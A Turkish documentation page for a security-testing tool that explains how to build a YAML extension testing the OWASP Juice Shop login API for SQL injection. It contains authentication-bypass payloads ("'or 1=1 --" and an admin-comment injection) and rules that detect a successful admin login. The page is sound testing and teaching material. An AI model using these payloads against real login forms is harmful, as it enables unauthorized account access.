[link-app-examination]:     app-examination.md
[link-points]:              ../points/intro.md
[link-using-extension]:     ../using-extension.md
[link-meta-info]:           ../create-extension.md#structure-of-the-meta-info-section

[doc-collect-phase]:        ../phase-collect.md
[doc-match-phase]:          ../phase-match.md
[doc-modify-phase]:         ../phase-modify.md
[doc-generate-phase]:       ../phase-generate.md
[doc-detect-phase]:         ../detect/phase-detect.md

[link-juice-shop]:          https://www.owasp.org/index.php/OWASP_Juice_Shop_Project


#   Eklenti Değiştirmenin Oluşturulması

Bu belgede tanımlanan eklenti, bir SQLi açığı olan gelen ana isteği enjekte etmek için bazı yükleri değiştirecektir. Bu yükler, [“OWASP Juice Shop”][link-juice-shop] hedef uygulamanın giriş formundaki açığı sömürebilir.
  
##  Hazırlıklar

FAST eklentisi oluşturmadan önce bu adımların atılması şiddetle tavsiye edilir:
1.  Eklentiyi oluşturduğunuz hedef uygulamanın davranışlarını [inceleyin][link-app-examination].
2.  Eklenti için nokta oluşturmanın ilkelelerini [okuyun][link-points].


##  Eklentinin Oluşturulması

Eklentiyi tanımlayan bir dosya oluşturun (`mod-extension.yaml` örneğin) ve gerekli bölümlerle doldurun:

1.  [**`meta-info` bölümü**][link-meta-info].

    Eklentinin algılamaya çalışacağı açığın açıklamasını hazırlayın.
    * açıklık başlığı: `OWASP Juice Shop SQLi (mod eklentisi)`
    * açıklık tanımı: `OWASP Juice Shop'ta SQLi denemesi (Admin Giriş)`
    * açıklık türü: SQL enjeksiyon
    * açıklık tehdit seviyesi: yüksek
    
    İlgili `meta-info` bölümü aşağıdaki gibi görünmelidir:
    
    ```
    meta-info:
      - type: sqli
      - threat: 80
      - title: 'OWASP Juice Shop SQLi (mod extension)'
      - description: 'Demo of SQLi in OWASP Juice Shop (Admin Login)'
    ```
    
2.  **`collect` bölümü, [Collect aşaması][doc-collect-phase]**.
    
    Oturum açmaya çalışırken `POST /rest/user/login` REST API metodu çağrılır.
    
    Giriş için API'ye gönderilen ana isteklerin her biri için test isteklerini oluşturmanıza gerek yoktur çünkü her veri parçası için açıklıkları test etme aynı şekilde gerçekleştirilecektir.
    
    Eklentiyi, API giriş isteğini aldığında sadece bir kez yürütecek şekilde kurun. Bunu yapmak için eklentiye benzersizlik durumu olan Collect aşamasını ekleyin.

    API'ye `/rest/user/login` giriş isteği şunları içerir:

    1.  yoluun ilk kısmın `rest` değeri,
    2.  yolun ikinci kısmının `user` değeri, ve
    3.  `login` eylem metodu
    
    Bu değerlere atıfta bulunan ilgili noktalar aşağıdaki gibidir:

    1.  yoluun ilk kısmı için `PATH_0_value`
    2.  yolun ikinci kısmı için `PATH_1_value`
    3.  `login` eylem metodu için `ACTION_NAME_value`
    
    Bu üç elementin kombinasyonunun benzersiz olma koşulunu eklerseniz, eklenti sadece API'ye ilk `/rest/user/login` ana istek için çalışacaktır (bu istek benzersiz olarak kabul edilecek ve giriş için API'ye gönderilen tüm diğer istekler benzersiz olmayacaktır). 
    
    Eklenti YAML dosyasına ilgili `collect` bölümünü ekleyin. 
    
    ```
    collect:
      - uniq:
        - [PATH_0_value, PATH_1_value, ACTION_NAME_value]
    ```

3.  **`match` bölümü, [Match aşaması][doc-match-phase]**.
    
    Gelen ana isteğin gerçekten de giriş için olan API isteği olup olmadığını kontrol etmek gereklidir çünkü oluşturduğumuz eklenti, giriş formunda bulunan açıklıkları sömürebilecektir.
    
    Eklentiyi, yalnızca bir ana başvurunun aşağıdaki URI'ye hedeflendiğinde çalışacak şekilde ayarlayın: `/rest/user/login`. Gelen isteğin gerekli elemanları içerip içermediğini kontrol eden Match aşamasını ekleyin. Bu, aşağıdaki `match` bölümü kullanılarak yapılabilir:

    ```
    match:
      - PATH_0_value: 'rest'
      - PATH_1_value: 'user'
      - ACTION_NAME_value: 'login'
    ```

4.  **`modify` bölümü, [Modify aşaması][doc-modify-phase]**.
    
    Varsayalım ki, ana isteği aşağıdaki hedeflere ulaşmak için değiştirmek gerekiyor:
    * `Accept-Language` HTTP başlık değerini temizlemek (bu değer açığın tespit edilmesi için gerekli olmayacak)
    * `email` ve `password` parametrelerinin gerçek değerlerini nötr `dummy` değerleriyle değiştirmek
    
    Yukarıda bahsedilen hedeflere ulaşan isteği değiştirecek aşağıdaki `modify` bölümünü eklentinin içine ekleyin:
    
    ```
    modify:
      - "HEADER_ACCEPT-LANGUAGE_value": ""
      - "POST_JSON_DOC_HASH_email_value": "dummy"
      - "POST_JSON_DOC_HASH_password_value": "dummy"
    ```
    
    !!! info "İstek elementleri tanım sözdizi"
        JSON formatındaki istek verisi `<key: value>` çiftlerinde saklandığı için, `email` eleman değerine atıfta bulunan nokta yukarıda gösterildiği gibi görünür. `password` eleman değerine atıfta bulunan noktanın benzer bir yapısı var.
        
        Noktaları oluştururken detaylı bilgi almak için [bu bağlantıya][link-points] gidin.
 
5.  **`generate` bölümü, [Generate aşaması][doc-generate-phase]**.

    Hedef uygulamadaki SQL injection açığını sömürmek için ana istekteki `email` parametresinin değerini değiştirmesi gereken iki yük olduğu bilinmektedir:
    * `'or 1=1 --`
    * `admin@juice-sh.op'--`
        
    !!! info "Yükün değiştirilmiş isteğe eklenmesi"
        Eklenti `modify` bölümünü içerdiği için yük, önceden değiştirilmiş isteğe eklenecektir. Bu nedenle, ilk yükü `email` alanına ekledikten sonra, test isteği verileri aşağıdaki gibi görünmelidir:
    
        ```
        {
            "email": "'or 1=1 --",
            "password":"dummy"
        }
        ```
    
        Seçilen yükler nedeniyle herhangi bir şifre ile başarılı bir şekilde giriş yapılabileceği için, şifre alanına yük eklemeye gerek yoktur, bu alan Modify aşaması uygulandıktan sonra `dummy` değerine sahip olacaktır.
    
        Yukarıda tartışılan gereksinimleri karşılayan test isteklerini oluşturacak `generate` bölümünü ekleyin.
    
        ```
        generate:
          - payload:
            - "'or 1=1 --"
            - "admin@juice-sh.op'--"
          - into: "POST_JSON_DOC_HASH_email_value"
          - method:
            - replace
        ```

6.  **`detect` bölümü, [Detect aşaması][doc-detect-phase]**.
    
    Kullanıcının yönetici haklarıyla başarılı bir şekilde kimlik doğrulaması gerçekleştirdiğini belirten koşullar aşağıdaki gibidir:
    * Cevap vücudunda alışveriş sepeti tanımlayıcısı parametresinin `1` değerinin varlığı. Bu parametre JSON formatında olmalı ve aşağıdaki gibi görünmelidir:
    
        ```
        "bid":1
        ```
    
    * Cevap vücudunda kullanıcı e-postası parametresinin `admin@juice-sh.op` değerinin bulunması. Bu parametre JSON formatında olmalı ve aşağıdaki gibi görünmelidir:
    
        ```
         "umail":"admin@juice-sh.op"
        ```
    
    Saldırının başarılı olduǧunu kontrol eden `detect` bölümünü ekleyin.
    
    ```
    detect:
      - response:
        - body: "\"umail\":\"admin@juice-sh.op\""
        - body: "\"bid\":1"
    ```
    
!!! info "Belirli sembolleri kaçınma"
    Dizelerdeki özel sembolleri kaçınmayı unutmayın.

##  Eklenti Dosyası

Şu anda `mod-extension.yaml` dosyası eklentinin çalışması için gerekli olan bölümlerin tamamını içeriyor. Dosyanın içeriğinin listesi aşağıdadır:

??? info "mod-extension.yaml"
    ```
    meta-info:
      - type: sqli
      - threat: 80
      - title: 'OWASP Juice Shop SQLi (mod extension)'
      - description: 'Demo of SQLi in OWASP Juice Shop (Admin Login)'

    collect:
      - uniq:
        - [PATH_0_value, PATH_1_value, ACTION_NAME_value]

    match:
      - PATH_0_value: 'rest'
      - PATH_1_value: 'user'
      - ACTION_NAME_value: 'login'

    modify:
      - "HEADER_ACCEPT-LANGUAGE_value": ""
      - "POST_JSON_DOC_HASH_email_value": "dummy"
      - "POST_JSON_DOC_HASH_password_value": "dummy"

    generate:
      - payload:
        - "'or 1=1 --"
        - "admin@juice-sh.op'--"
      - into: "POST_JSON_DOC_HASH_email_value"
      - method:
        - replace

    detect:
      - response:
        - body: "\"umail\":\"admin@juice-sh.op\""
        - body: "\"bid\":1"
    ```

##  Eklentinin Kullanımı

Oluşturulan ifadeyi nasıl kullanacağınıza dair detaylı bilgi için [bu belgeyi][link-using-extension] okuyun.